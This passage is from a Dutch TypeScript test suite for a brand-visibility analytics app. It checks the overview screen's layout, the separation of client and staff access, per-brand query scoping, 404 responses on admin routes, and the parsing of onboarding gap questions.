    ...Array.from({ length: 30 }, (_, i) => ({
      type: "measure_prompt",
      finished_at: `2026-08-17T10:${String(i).padStart(2, "0")}:00Z`,
    })),
    { type: "aggregate_week", finished_at: "2026-08-17T11:00:00Z" },
    { type: "generate_report", finished_at: "2026-08-17T11:30:00Z" },
  ];
  const regels = activiteit(taken);
  ok("drie regels", regels.length === 3);
  ok("nieuwste eerst", regels[0].tekst.includes("rapport"));
  const meting = regels.find((r) => r.tekst.includes("vraag aan een AI-assistent"));
  ok("de meetronde is er één regel met een teller", meting?.aantal === 30);
  ok("en draagt het laatste tijdstip", meting?.laatst === "2026-08-17T10:29:00Z");

  // Een taak die nog loopt heeft geen eindtijd en hoort er dus niet in: de kop
  // belooft wat ORBIT ENGINE deed, niet wat het aan het doen is.
  ok(
    "een onafgeronde taak telt niet mee",
    activiteit([{ type: "gsc_sync", finished_at: null }]).length === 0,
  );
  ok(
    "een onbekende taaksoort valt weg in plaats van als sleutel te verschijnen",
    activiteit([{ type: "iets_nieuws", finished_at: "2026-08-17T12:00:00Z" }]).length === 0,
  );
});

group("het overzicht: één hoofdgetal, één primaire knop, één rekensom", () => {
  // ⚠️ BRONCODECONTROLE, om dezelfde reden als de klantschermcontrole hieronder:
  // een handmatige doorloop gebeurt één keer, het risico ontstaat bij de
  // volgende wijziging.
  const overzicht = readFileSync("app/(app)/merk/[id]/page.tsx", "utf8");

  // Alle vijf de werksoorten stonden op amber. "Bekijk wat er mis is" (een
  // cluster dat niet gelukt is) zag er daardoor precies zo uit als "Nakijken".
  // `docs/ux-design.md` §2: warning is "kijk hier even naar", danger is
  // "blokkade, mislukt", attention is "vraagt een keuze, is niet fout". Sinds
  // 25 augustus 2026 draagt de KAART die toon en niet meer een chip van 60
  // pixels, maar het onderscheid moet blijven bestaan.
  ok("de soort werk bepaalt de toon", overzicht.includes("workChipTone(item.kind)"));

  // ── ⚠️ ÉÉN PRIMAIRE KNOP (25 AUGUSTUS 2026) ─────────────────────────────
  //
  // Dit scherm is de bestemming na inloggen (`app/page.tsx`) en had géén enkele
  // primaire knop: de enige verzadigde kleur was een chip, en een chip is een
  // etiket. Het scherm vroeg nergens om een klik. Een tweede primaire knop is
  // net zo fout: dan kiest de klant welke van de twee de hoofdactie is, en dan
  // is er geen.
  ok(
    "precies één primaire knop op het scherm",
    (overzicht.match(/btn-primary/g) ?? []).length === 1,
  );

  // Het hoofdgetal stond vier keer op dit scherm, in drie schalen. De subkop is
  // er één van, en dat is de makkelijkste om per ongeluk terug te zetten.
  ok(
    "de subkop noemt het percentage niet",
    !overzicht.includes("van de vragen waarin ze een aanbieder"),
  );

  // ── ⚠️ ÉÉN REKENSOM VOOR HET MERKCIJFER ─────────────────────────────────
  //
  // De standkaart rekende hier zijn eigen gewogen gemiddelde uit terwijl
  // `lib/insights-data.ts` en het toenmalige `lib/milestones-data.ts` een ongewogen
  // namen. Op één scherm stond daardoor 57%, "van 30 naar 60" en "+30 punten".
  // Dit scherm mag die som niet meer zelf doen.
  ok(
    "het scherm haalt de scores niet zelf op",
    !overzicht.includes('from("visibility_scores")'),
  );
  ok("en rekent ze niet zelf om", !overzicht.includes("function merkCijfer"));

  // De regel onder de merknaam zegt hoe vers de meting is. Zonder die regel ziet
  // een wekelijkse bezoeker vier keer hetzelfde maandcijfer zonder te weten dat
  // het hetzelfde is.
  ok("de kop zegt hoe vers de meting is", overzicht.includes("versheidsregel"));

  // Zeven databronnen op de startpagina van de klant: één onverwachte datavorm
  // mag niet het hele scherm weghalen (`docs/ux-design.md` §4). Vijf blokken
  // sinds het opbrengstblok eraf ging (26 augustus 2026).
  ok(
    "elk blok staat in zijn eigen foutopvang",
    (overzicht.match(/<SectionErrorBoundary/g) ?? []).length >= 5,
  );

  // ── ⚠️ HET ZICHTBAARHEIDSPERCENTAGE STAAT HIER WEER ─────────────────────
  //
  // Op 26 augustus 2026 verhuisde het naar Analytics, zodat de startpagina de
  // omvang van het programma toonde. Op 27 augustus is dat teruggedraaid, en
  // het waarom is een productvraag en geen smaakvraag: een meetproduct dat
  // opent met vier productietellingen laat de klant eerst zien hoeveel er
  // gemaakt is, terwijl hij komt kijken of het wérkt. Het cijfer waarvoor hij
  // betaalt, stond een klik verderop.
  //
  // Wat hier NIET mag terugkeren is de valse winst. Het cijfer komt met zijn
  // marge, en een verschil binnen die marge heet "gelijk gebleven" en geen
  // stijging. Dat is dezelfde lat als op Analytics.
  ok("het hoofdgetal staat op de startpagina", overzicht.includes("text-5xl"));
  ok("met zijn onzekerheidsmarge erbij", overzicht.includes("confidenceBand"));
  ok(
    "en een verschil binnen de marge telt niet als winst",
    overzicht.includes("changeIsMeaningful"),
  );

  // ── ⚠️ DE RONDE STAAT BOVEN DE CIJFERS ──────────────────────────────────
  //
  // Het product is een kringloop en het menu is een kast. Stond die kringloop
  // nergens, dan wist de klant wel wat hij vandaag moest doen maar niet waar
  // het toe leidde. Eerst hoe het werkt, dan hoe het ervoor staat.
  ok("de ronde staat op de startpagina", overzicht.includes("<RondeBalk"));
  ok(
    "en boven de cijfers",
    overzicht.indexOf("<RondeBalk") < overzicht.indexOf("<CijferRij"),
  );

  // ── ⚠️ SECTIEKOPPEN ZIJN KOPPEN ─────────────────────────────────────────
  //
  // Ze waren `<span className="mono-label">`, precies dezelfde opmaak als een
  // regel metadata ín een kaart. Daardoor had de pagina één kop (`h1`) en
  // daaronder acht naamloze blokken.
  ok("de secties hebben echte koppen", overzicht.includes("<SectionHeading"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe grens tussen klant en beheerder (besluit 4)");

group("de klantweergave kan nooit rechten geven, alleen wegnemen", () => {
  // ⚠️ Dit zijn broncodecontroles en geen pure functies: `isStaff()` leest de
  // database en een cookie, en dat hoort niet in `test-unit.ts` (conventie 2).
  // Wat WEL hier hoort: de garantie dat de wisselknop een echte beheerder
  // nooit buitensluit, en een klant nooit binnenlaat.
  const staff = readFileSync("lib/staff.ts", "utf8");

  // De cookie wint alleen als het echte recht er al was. `isStaffAccount` moet
  // eerst gecontroleerd worden en bij `false` meteen stoppen, vóór de cookie
  // gelezen wordt: anders zou een klant die toevallig dezelfde cookie zet zich
  // ergens tussenin kunnen wurmen.
  ok(
    "isStaff stopt op het echte recht vóór hij de cookie leest",
    /const echt = await isStaffAccount\(userId\);\s*\n\s*if \(!echt\) return false;/.test(
      staff,
    ),
  );

  const actions = readFileSync("app/(app)/workspace-actions.ts", "utf8");
  // Uitzetten mag altijd, zonder enige controle: dat kan nooit iemand méér
  // rechten geven. Aanzetten mag alleen als `isStaffAccount` het echt is.
  ok(
    "aanzetten controleert het echte recht",
    /if \(!aan \|\| !\(await isStaffAccount\(user\.id\)\)\)/.test(actions),
  );

  // De wisselknop zelf moet op het ECHTE recht hangen (`staffAccount`), niet op
  // het effectieve (`staff`). Zou hij op `staff` hangen, dan verdwijnt de knop
  // zodra je hem indrukt, en is er geen weg terug zonder de cookie met de hand
  // te wissen.
  const shell = readFileSync("components/app-shell.tsx", "utf8");
  ok(
    "de knop zelf hangt op het echte recht, niet op het effectieve",
    /previewToggle=\{staffAccount \?/.test(shell),
  );
  ok("en niet per ongeluk op staff", !/previewToggle=\{staff \?/.test(shell));

  // En elke bestaande beheercontrole in de app blijft ongewijzigd `isStaff`
  // aanroepen: de klantweergave moet overal vanzelf gelden, zonder dat een
  // scherm daar apart voor hoeft te coderen.
  const gate = readFileSync("lib/cost-guard.ts", "utf8");
  ok("het kostenslot blijft het effectieve recht gebruiken", gate.includes("isStaff(userId)"));
});

group("het contentplan heeft twee weergaven", () => {
  const scherm = readFileSync("app/(app)/merk/[id]/strategie/plan/page.tsx", "utf8");

  // ⚠️ Allebei bereikbaar voor iedereen; alleen het beginpunt verschilt. De
  // klant landt op het overzicht en gaat met één klik naar het bord, de
  // consultant landt op het bord. Tot 27 augustus 2026 was er alleen het bord,
  // ook voor de klant, met bovenaan "sleep beschikbare content items naar de
  // maand waarin ze geschreven moeten worden".
  ok("de leesweergave bestaat", scherm.includes("<PlanReadView"));
  ok("het bord bestaat", scherm.includes("<PlanView"));
  ok("er is een schakelaar tussen de twee", scherm.includes("<WeergaveKiezer"));
  ok(
    "de rol bepaalt alleen het beginpunt",
    scherm.includes('const bord = weergave ? weergave === "plannen" : staff;'),
  );
  // Een weergave in de URL wint van de rol, zodat een gedeelde link bij de
  // klant en de consultant hetzelfde opent.
  ok("en de URL wint van de rol", scherm.includes("searchParams"));

  const lees = readFileSync(
    "app/(app)/merk/[id]/strategie/plan/plan-read-view.tsx",
    "utf8",
  );
  // Eén handeling op de leesweergave: een maand vrijgeven. Alles wat de
  // indeling verandert staat op het bord. Twee schermen die allebei half
  // kunnen plannen is erger dan één dat het helemaal kan en één dat leest.
  ok("de leesweergave kan een maand vrijgeven", lees.includes("<ReleaseMonthButton"));
  ok("en wijst naar het bord om te schuiven", lees.includes("weergave=plannen"));
  for (const verboden of ["onDrag", "draggable", "setSleep", "onDropHier"]) {
    ok(`en sleept zelf niet (${verboden})`, !lees.includes(verboden));
  }
});

group("een klant ziet nooit twee merken tegelijk", () => {
  // ⚠️ DE REGEL: geen enkel klantscherm toont gegevens van meer dan één merk.
  // Dat was tot 27 augustus 2026 een filter op het scherm en geen grens in de
  // query: `loadWorkAcross()` haalde élke analyse van de gebruiker op en de
  // twee schermen die hem aanriepen filterden daarna zelf. Filteren is een
  // intentie, de query is de garantie (conventie 1). Bij een bureau met drie
  // merken in één account kost één vergeten filter de klantrelatie.
  // ⚠️ Zonder commentaar, want juist de toelichting bovenaan die bestanden
  // noemt de oude namen om uit te leggen waarom ze weg zijn. Een test die daar
  // op valt, dwingt je de uitleg te schrappen, en dan is de reden weg.
  const zonderUitleg = (bron: string) =>
    bron.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");

  const werk = zonderUitleg(readFileSync("lib/work.ts", "utf8"));
  ok("de werklader kent geen 'over alle merken heen' meer", !werk.includes("loadWorkAcross"));
  ok(
    "en het merk gaat mee de database in",
    /\.eq\("user_id", userId\)\.eq\("profile_id", profileId\)/.test(werk),
  );

  const dash = zonderUitleg(readFileSync("lib/dashboard.ts", "utf8"));
  ok("het dashboard vraagt om een merk", /loadDashboard\([\s\S]{0,120}profileId: string/.test(dash));
  // De twee aggregaten die over merken heen telden zijn weg met het scherm dat
  // ze toonde. Een aggregaat zonder scherm is precies wat er per ongeluk
  // terugkomt op een klantscherm.
  for (const dood of ["biggestChange", "publishedThisMonth", "openOffsiteTasks"]) {
    ok(`en telt niet meer over merken heen (${dood})`, !dash.includes(dood));
  }

  const overzicht = readFileSync("app/(app)/merk/[id]/page.tsx", "utf8");
  ok("het overzicht geeft zijn merk mee", overzicht.includes("loadBrandWork(supabase, user.id, id)"));
  const clusters = readFileSync(
    "app/(app)/merk/[id]/strategie/clusters/page.tsx",
    "utf8",
  );
  ok("de clusterlijst ook", clusters.includes("loadDashboard(supabase, user.id, id)"));

  // Het enige klantscherm waar meer dan één merk in beeld kán komen is de
  // merkenlijst, en dat is een keuzemenu: namen, geen cijfers. Heeft de klant
  // er maar één, dan slaat hij die tussenstap over.
  const merken = readFileSync("app/(app)/merk/page.tsx", "utf8");
  ok(
    "één merk betekent geen keuzelijst",
    merken.includes("if (!staff && profiles.length === 1) redirect("),
  );
});

group("geen interne stof op een klantscherm", () => {
  // ⚠️ DIT IS DE VERIFICATIE VAN FASE 6, EN HIJ IS BEWUST EEN BRONCODECONTROLE.
  //
  // Het uitvoerplan schrijft voor: log in als klantaccount en loop alle
  // bestemmingen af, geen enkele toont ruwe modeloutput, een promptinstructie,
  // een modelnaam of een bedrag. Zo'n doorloop gebeurt één keer en daarna nooit
  // meer, terwijl het risico juist bij de vólgende wijziging ontstaat. Deze test
  // leest daarom de bronbestanden, net als de bestaande controle op de twee
  // remmen bij betaald werk.
  //
  // Wat er misgaat als hij ontbreekt: iemand zet een kostenregel of een
  // modelnaam op een klantscherm, het valt niemand op, en de eigenaar ontdekt
  // het tijdens een demo met de klant ernaast.
  const verboden = [
    { term: "ai_calls", waarom: "kostenlogboek" },
    { term: "cost_usd", waarom: "bedrag per aanroep" },
    { term: "model_used", waarom: "modelnaam" },
    { term: "openai_response_id", waarom: "interne aanroep-id" },
    { term: "MODELS.", waarom: "modelnaam" },
    // ⚠️ `profile_field_sources` zelf mág: de herkomstchip in de wizard ("uit je
    // website gehaald") is een klantfunctie en leest `field` en `source`. Wat
    // niet mag is het BEWIJS eronder, het citaat en de bron-URL; dat is
    // onderzoeksdetail en staat op Admin (besluit 4, §5).
    // ⚠️ Alleen `evidence_quote`, niet `evidence_url`. Die kolomnaam bestaat
    // twee keer: op `profile_field_sources` (intern bewijs bij een profielveld)
    // én op `profile_offerings`, waar hij naar de pagina op de site van de klant
    // zelf wijst. Dat tweede is juist een klantfunctie ("dit vonden we hier"),
    // en een controle die dat verbiedt zou een goede functie slopen.
    { term: "evidence_quote", waarom: "bewijscitaat uit het onderzoek" },
  ];

  const klantSchermen = tsxOnder("app/(app)").filter(
    (f) => !f.includes("/admin/") && !f.includes("/beheer/"),
  );
  ok(`er zijn klantschermen gevonden (${klantSchermen.length})`, klantSchermen.length > 20);

  for (const { term, waarom } of verboden) {
    const treffers = klantSchermen.filter((f) => leesBestand(f).includes(term));
    ok(
      `geen ${waarom} (${term})${treffers.length ? " in " + treffers.join(", ") : ""}`,
      treffers.length === 0,
    );
  }

  // Ruwe JSON tonen is een aparte controle: `raw_json` mág gelezen worden om er
  // één veld uit te halen (de open punten komen er letterlijk uit), maar het
  // hele object afdrukken hoort alleen op Admin.
  const jsonDump = klantSchermen.filter((f) => {
    const inhoud = leesBestand(f);
    return inhoud.includes("JSON.stringify(") && inhoud.includes("raw_json");
  });
  ok(`geen ruwe JSON afgedrukt${jsonDump.length ? " in " + jsonDump.join(", ") : ""}`, jsonDump.length === 0);

  // De promptteksten die naar het model gaan horen in de pijplijn, niet in een
  // scherm. Een klant die de instructie leest, leest ons product.
  const promptLek = klantSchermen.filter((f) => leesBestand(f).includes("SYSTEM_PROMPT"));
  ok(`geen promptinstructie${promptLek.length ? " in " + promptLek.join(", ") : ""}`, promptLek.length === 0);

  // ⚠️ Een `select("*")` op een tabel met een `raw_json`-kolom stuurt die ruwe
  // modeloutput mee naar de browser, ook als het scherm hem nergens toont. Dat
  // is geen zichtbaar lek maar het staat wél in de paginabron, en het is precies
  // het soort ding dat je in een demo niet wilt hoeven uitleggen.
  const metRuweKolom = ["topic_research", "profile_facets", "technical_audits"];
  const sterLek = klantSchermen.filter((f) => {
    const inhoud = leesBestand(f);
    return metRuweKolom.some((tabel) =>
      new RegExp(`from\\("${tabel}"\\)[\\s\\S]{0,80}?select\\("\\*"\\)`).test(inhoud),
    );
  });
  ok(
    `geen select("*") op een tabel met ruwe modeloutput${sterLek.length ? " in " + sterLek.join(", ") : ""}`,
    sterLek.length === 0,
  );
});

group("de afgeschermde routes zijn ook echt afgeschermd", () => {
  // Elke route die alleen voor beheerders is, moet `isStaff` aanroepen. Vergeet
  // er eentje dat, dan is het adres gewoon te raden.
  const afgeschermd = [
    "app/(app)/merk/[id]/admin/page.tsx",
    "app/(app)/merk/[id]/admin/onboarding/page.tsx",
    "app/(app)/merk/[id]/admin/toewijzen/page.tsx",
    "app/(app)/beheer/page.tsx",
    "app/(app)/instellingen/koppelingen/page.tsx",
    "app/api/analyses/[id]/costs/route.ts",
  ];
  for (const pad of afgeschermd) {
    const inhoud = leesBestand(pad);
    ok(`${pad} vraagt isStaff`, inhoud.includes("isStaff"));
    // ⚠️ Een 403 bevestigt dat het scherm bestaat. Dat is precies wat een klant
    // van een ander bureau niet hoort te weten.
    ok(
      `${pad} antwoordt met een 404 en geen 403`,
      inhoud.includes("notFound()") || inhoud.includes("status: 404"),
    );
    ok(`${pad} noemt nergens 403`, !inhoud.includes("status: 403"));
  }
});

group("de zijbalk verraadt niets aan een klant", () => {
  const merkId = "abc";
  const klantItems = [...brandNav(merkId, false), ...generalNav(false)];

  // Geen enkel item wijst naar een afgeschermd adres.
  ok(
    "geen admin-adres in het klantmenu",
    klantItems.every((i) => !i.href.includes("/admin") && i.href !== "/beheer"),
  );
  ok("en geen enkel item is als staff-only gemarkeerd", klantItems.every((i) => !i.staffOnly));

  // Bij een beheerder staat elk afgeschermd item wél gemarkeerd, zodat hij niet
  // per ongeluk tijdens een gedeeld scherm op een interne pagina klikt.
  const staffItems = [...brandNav(merkId, true), ...generalNav(true)];
  const adminItems = staffItems.filter((i) => i.hoofdstuk === "Admin");
  // Drie over dít merk plus "Alle merken" en "Koppelingen" over de app als
  // geheel.
  ok("een beheerder heeft vijf Admin-bestemmingen", adminItems.length === 5);
  ok(
    "en Koppelingen staat erbij",
    adminItems.some((i) => i.href === "/instellingen/koppelingen" && i.label === "Koppelingen"),
  );
  ok(
    "en de onboardingsessie staat erbij",
    adminItems.some((i) => i.href.endsWith("/admin/onboarding") && i.label === "Onboarding"),
  );
  ok(
    "met Diagnose ernaast, en niet nog een keer 'Onboarding-inzicht'",
    adminItems.some((i) => i.label === "Diagnose") &&
      !adminItems.some((i) => i.label === "Onboarding-inzicht"),
  );
  ok("allemaal gemarkeerd", adminItems.every((i) => i.staffOnly === true));
  ok(
    "en de klant ziet er nul",
    klantItems.filter((i) => i.hoofdstuk === "Admin").length === 0,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDiagnose (Admin)");

group("de doorlooptijden houden ketenvolgorde", () => {
  const taken = [
    tk("profile_synthesis", "done", "2026-08-01T10:10:00Z", "2026-08-01T10:10:30Z"),
    tk("profile_discover", "done", "2026-08-01T10:00:00Z", "2026-08-01T10:01:00Z"),
    tk("profile_research", "error", "2026-08-01T10:02:00Z", null),
    // Geen onboardingtaak: hoort hier niet in.
    tk("measure_prompt", "done", "2026-08-01T11:00:00Z", "2026-08-01T11:00:05Z"),
  ];
  const t = doorlooptijden(taken);

  // ⚠️ Op ketenvolgorde en niet op tijd. Wie ziet dat een stap ontbreekt weet
  // dan meteen dat de staart is blijven hangen; op tijd sorteren verbergt dat,
  // want een taak die nooit draaide heeft geen tijd.
  ok(
    "op ketenvolgorde",
    t.map((x) => x.type).join(",") === "profile_discover,profile_research,profile_synthesis",
  );
  ok("een taak buiten de onboarding valt weg", !t.some((x) => x.type === "measure_prompt"));
  ok("de doorlooptijd is in seconden", t[0].secondenr === 60);
  // Conventie 3: zonder eindtijd is de duur onbekend, niet nul.
  ok("een taak zonder eindtijd heeft geen duur", t[1].secondenr === null);
  ok("en houdt zijn status", t[1].status === "error");

  ok("een lege lijst geeft een lege lijst", doorlooptijden([]).length === 0);
  ok("geen starttijd geeft null", duurSeconden(null, "2026-08-01T10:00:00Z") === null);
  ok("een negatieve duur geeft null", duurSeconden("2026-08-01T10:00:00Z", "2026-08-01T09:00:00Z") === null);

  function tk(type: string, status: string, started: string | null, finished: string | null) {
    return { type, status, started_at: started, finished_at: finished, attempts: 1, last_error: null };
  }
});

group("de negen secties zijn die van de klant", () => {
  ok("negen secties", ADMIN_SECTIES.length === 9);
  ok(
    "in Nova's volgorde",
    ADMIN_SECTIES.map((s) => s.naam).join(" · ") ===
      "Bedrijf · Contact · Talen · Positionering · Doelgroep · Stem · Woorden · Auteur · Onderwerpen",
  );
  ok("acht onboardingtaken", ONBOARDING_TAKEN.length === 8);
  ok("allemaal echte taaksoorten", ONBOARDING_TAKEN.every((t) => TAAK_TEKST[t] !== undefined));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nOpen punten op het merkprofiel");

group("findGaps noemt het gevolg, niet het gemis", () => {
  const compleet = {
    aliases: ["Fysi Unique"],
    proof_points: ["sinds 2009", "12 fysiotherapeuten", "4,8 op Google"],
    service_scope: "lokaal",
    service_regions: ["Amersfoort"],
    business_model: "dienstverlener",
  };
  ok("een compleet profiel heeft geen open punten", findGaps(compleet).length === 0);

  ok(
    "geen schrijfwijzen is een punt",
    findGaps({ ...compleet, aliases: [] }).some((g) => g.label.includes("schrijfwijzen")),
  );
  // Onder de drie, niet onder de één: met twee feiten wordt een tekst nog
  // steeds algemeen, en algemeen wordt niet geciteerd.
  ok(
    "twee bewijspunten is te weinig",
    findGaps({ ...compleet, proof_points: ["a", "b"] }).length === 1,
  );
  ok("drie is genoeg", findGaps({ ...compleet, proof_points: ["a", "b", "c"] }).length === 0);

  // Alleen bij een lokaal merk. Vier van de negen profielen hadden op
  // 11 augustus 2026 `service_scope = null`, en dan mag deze regel niet slaan.
  ok(
    "een lokaal merk zonder plaats is een punt",
    findGaps({ ...compleet, service_regions: [] }).some((g) => g.label.includes("plaats")),
  );
  ok(
    "een landelijk merk zonder plaats niet",
    findGaps({ ...compleet, service_scope: "landelijk", service_regions: [] }).length === 0,
  );

  ok(
    "elk punt zegt wát het verbetert",
    findGaps({ aliases: [], proof_points: [], service_scope: null, service_regions: [], business_model: null })
      .every((g) => g.effect.length > 40),
  );

  // ── Op gevolg gesorteerd, niet op veldvolgorde (onboarding 3.0, fase 3) ──
  //
  // ⚠️ De onboardingsessie opent met deze lijst. Zonder deze volgorde kost het
  // gesprek een uur aan het bevestigen van dingen die al klopten, en het
  // zwaarste punt zakt naar onderen omdat het toevallig achteraan in de
  // veldenlijst staat.
  const alles = findGaps({
    aliases: [],
    proof_points: [],
    service_scope: "lokaal",
    service_regions: [],
    business_model: null,
  });
  ok("alle vier de punten komen eruit", alles.length === 4);
  ok(
    "het bereik staat bovenaan, want die fout kost een nieuwe meetronde",
    alles[0].field === "service_regions",
    alles.map((g) => g.field).join(" > "),
  );
  ok(
    "en de bewijspunten onderaan, die raken pas de tekst",
    alles[alles.length - 1].field === "proof_points",
  );
  ok(
    "de volgorde loopt aflopend op gewicht",
    alles.every((g, i) => i === 0 || alles[i - 1].weight >= g.weight),
  );
  ok(
    "elk punt wijst naar een veld, anders is de springknop nergens op te richten",
    alles.every((g) => g.field.length > 0),
  );

  // ── Niet van toepassing valt weg ─────────────────────────────────────────
  //
  // Een merk zonder auteur heeft geen auteursbio, en een merk dat bewust geen
  // andere schrijfwijzen heeft is geen gat. Zonder deze regel haalt de lijst
  // nooit nul en wordt hij binnen twee gesprekken genegeerd.
  const metNvt = findGaps(
    {
      aliases: [],
      proof_points: [],
      service_scope: "lokaal",
      service_regions: [],
      business_model: null,
    },
    ["aliases", "proof_points"],
  );
  ok("een n.v.t.-veld staat niet meer in de lijst", metNvt.length === 2);
  ok(
    "en de rest houdt zijn volgorde",
    metNvt[0].field === "service_regions" && metNvt[1].field === "business_model",
  );

  // ── Elk punt heeft een bestemming (24 augustus 2026) ─────────────────────
  //
  // ⚠️ De knop "Invullen" is de enige reden dat een open punt op het
  // klantscherm mag staan: zonder bestemming is het een mededeling waar je
  // niets mee kunt, en dat is precies waar dit scherm op stukliep. Wijst één
  // gat naar een veld dat de klantwizard niet toont, dan valt de knop weg en
  // staat de regel er weer voor niets.
  ok(
    "elk open punt wijst naar een veld op het bewerkscherm",
    alles.every((g) => gapLink("m1", g.field) !== null),
    alles.map((g) => `${g.field}:${gapLink("m1", g.field)}`).join(" | "),
  );
  ok(
    "de link draagt de stap én het anker, want de wizard toont één stap tegelijk",
    gapLink("m1", "proof_points") ===
      "/merk/m1/merkprofiel/bewerken?stap=bekend#veld-anker-proof_points",
    String(gapLink("m1", "proof_points")),
  );
  ok(
    "een veld dat de klant niet ziet levert geen dode knop op",
    gapLink("m1", "goal_12m") === null,
  );
  ok("en een onbekend veld ook niet", gapLink("m1", "bestaat-niet") === null);
});

// ════════════════════════════════════════════════════════════════════════════
group("de open punten uit de synthese worden vragen die je kunt beantwoorden", () => {
  // ⚠️ DE KERN. Bij Van den Udenhout stonden er tien open punten onder de kop
  // "10 open" en was er geen enkel invoerveld: ze kwamen uit `raw_json.gaps` en
  // waren bedoeld als agenda voor het gesprek. Als `fact_requests`-rij pakt het
  // bestaande scherm ze wel op.
  const ruw = [
    "In welk jaar is Van den Udenhout opgericht?",
    "Hoeveel medewerkers heeft de organisatie momenteel?",
  ];
  const vragen = gapQuestions(ruw);
  ok("twee punten worden twee vragen", vragen.length === 2);
  ok("de tekst blijft die van het onderzoek", vragen[0].question === ruw[0]);
  ok("elke vraag zegt waarom hij gesteld wordt", vragen.every((v) => v.reason === GAP_REASON));
  ok("en verwacht een kort tekstantwoord", vragen.every((v) => v.answerType === "tekst_kort"));

  // Een opsomteken hoort niet in de kolom: de lijst op het scherm is de
  // opsomming al, en het streepje komt terug in élke plek die de vraag toont.
  ok(
    "een opsomteken voor de vraag gaat eraf",
    gapQuestions(["- Hoeveel vestigingen zijn er?", "1. En hoeveel showrooms?"])
      .map((v) => v.question)
      .join(" | ") === "Hoeveel vestigingen zijn er? | En hoeveel showrooms?",
  );
  ok(
    "dubbele witruimte wordt één spatie",
    gapQuestions(["Hoeveel   auto's  staan er op voorraad?"])[0].question ===
      "Hoeveel auto's staan er op voorraad?",
  );

  // De unieke index staat op de letterlijke tekst, dus twee vragen die alleen
  // in hoofdletters verschillen zouden er allebei in komen en twee keer gesteld
  // worden.
  ok(
    "hoofdletterverschil is geen tweede vraag",
    gapQuestions(["Hoeveel vestigingen?", "hoeveel vestigingen?"]).length === 1,
  );

  // Onbruikbare modeloutput wordt niets, geen gok (conventie 3).
  ok("lege regels vervallen", gapQuestions(["", "   ", "Hoeveel?"]).length === 1);
  ok("iets dat geen lijst is levert niets op", gapQuestions({ gaps: "x" }).length === 0);
  ok("en ontbrekende invoer ook niet", gapQuestions(undefined).length === 0);
  ok(
    "niet-tekst in de lijst wordt overgeslagen",
    gapQuestions([42, null, "Hoeveel?"]).length === 1,
  );

  // Een alinea is geen vraag van dertig seconden. De prompt vraagt er expliciet
  // om ("concreet en in dertig seconden te beantwoorden"), dus een lap tekst is
  // een signaal dat het model iets anders deed.
  ok("een alinea van 250 tekens valt af", gapQuestions(["x".repeat(250)]).length === 0);

  // Meer dan twaalf is geen agenda meer maar een formulier, en dan wordt de
  // hele lijst genegeerd.
  const veel = Array.from({ length: 30 }, (_, i) => `Vraag ${i + 1}?`);
  ok(`hoogstens ${MAX_GAP_QUESTIONS} vragen`, gapQuestions(veel).length === MAX_GAP_QUESTIONS);
  ok("en de eerste blijven staan", gapQuestions(veel)[0].question === "Vraag 1?");

  // ── Het antwoord landt anders (24 augustus 2026) ─────────────────────────
  //
  // ⚠️ Een beantwoorde briefingvraag wordt óók een regel in `proof_points`, en
  // die krijgt in de feitenbank de bron "site <url>" mee. Voor een open punt is
  // dat onwaar: de klant vertelde het net, het stond nergens op zijn site. En
  // "welke drie klantgroepen krijgen komend jaar prioriteit" hoort geen
  // citeerbare bewering in een gepubliceerde pagina te worden. Het antwoord
  // raakt niets kwijt: `buildFactBase()` leest de beantwoorde vraag zelf al.
  ok("een omgezet open punt is herkenbaar", isGapQuestion({ bron: GAP_SOURCE }));
  ok("een vraag uit het merkdossier niet", isGapQuestion({ bron: "merkdossier" }) === false);
  ok("een briefingvraag zonder herkomst ook niet", isGapQuestion(null) === false);
  ok("en een vorm die we niet kennen evenmin", isGapQuestion("synthese-gap") === false);
});

group("de meter van de sessie: drie getallen, geen percentage", () => {
  // ⚠️ "78% compleet" verbergt precies het verschil dat in een gesprek telt:
  // hoeveel er door een mens bevestigd is en hoeveel er nog een aanname is.
  const leegProfiel = {};
  const leeg = sessionMeter(leegProfiel, {});
  ok("een leeg merk heeft alles open", leeg.open === leeg.totaal && leeg.bevestigd === 0);
  // De contactvelden tellen niet mee: ze zeggen niets over hoe goed ORBIT
  // ENGINE het merk kent.
  ok(
    `de contactvelden tellen niet mee (${leeg.totaal} van de ${BRAND_FIELDS.length})`,
    leeg.totaal === BRAND_FIELDS.length - 3,
  );

  const profiel = {
    industry: "fysiotherapie",
    summary: "Een praktijk in Amersfoort.",
    usp: "De enige met bekkenfysiotherapie",
    contact_name: "Sanne de Wit",
  } as never;
  const m = sessionMeter(profiel, {
    industry: { source: "gesprek" },
    summary: { source: "ai" },
    // ⚠️ Een consultantwaarde telt als GEVONDEN en niet als bevestigd: hij is
    // door een mens getypt maar door niemand bevestigd. Zou hij als bevestigd
    // tellen, dan ziet een merk waar nog nooit iemand mee gesproken is eruit
    // als een merk dat je al hebt doorgenomen.
    usp: { source: "consultant" },
  });
  ok("wat in het gesprek is gezet telt als bevestigd", m.bevestigd === 1);
  ok("modeluitvoer en een aanname tellen als gevonden", m.gevonden === 2);
  ok(
    "en elk veld valt in precies één bak",
    m.bevestigd + m.gevonden + m.open === m.totaal,
  );
  ok(
    "het contactveld telde niet mee, ook niet als het gevuld is",
    sessionMeter({ contact_name: "Sanne" } as never, {}).gevonden === 0,
  );

  // Niet van toepassing is behandeld, en dat is de hele reden dat die stand
  // bestaat: anders haalt de meter nooit 100% en wordt hij genegeerd.
  const nvt = sessionMeter(leegProfiel, { author_bio: { notApplicable: true } });
  ok("een n.v.t.-veld telt als bevestigd", nvt.bevestigd === 1);
  ok("en niet meer als open", nvt.open === leeg.open - 1);
  ok(
    "notApplicableFields noemt precies die velden",
    notApplicableFields({
      author_bio: { notApplicable: true },
      industry: { source: "gesprek" },
    }).join() === "author_bio",
  );
});

group("de sessiepagina wordt gedeeld met de klant (deel B3)", () => {
  // ⚠️ DIT IS DE BINDENDE REGEL VAN HET HELE PLAN, EN HIJ IS EEN
  // BRONCODECONTROLE.
  //
  // Elk ander stafscherm is intern. Dit scherm kijkt de klant mee, dus er mag
  // geen taaknaam, geen bedrag en geen foutcode in beeld komen. Zo'n controle
  // met de hand doe je één keer; het risico ontstaat bij de vólgende wijziging.
  const sessieBestanden = [
    "app/(app)/merk/[id]/admin/onboarding/page.tsx",
    "app/(app)/merk/[id]/_components/onboarding-session.tsx",
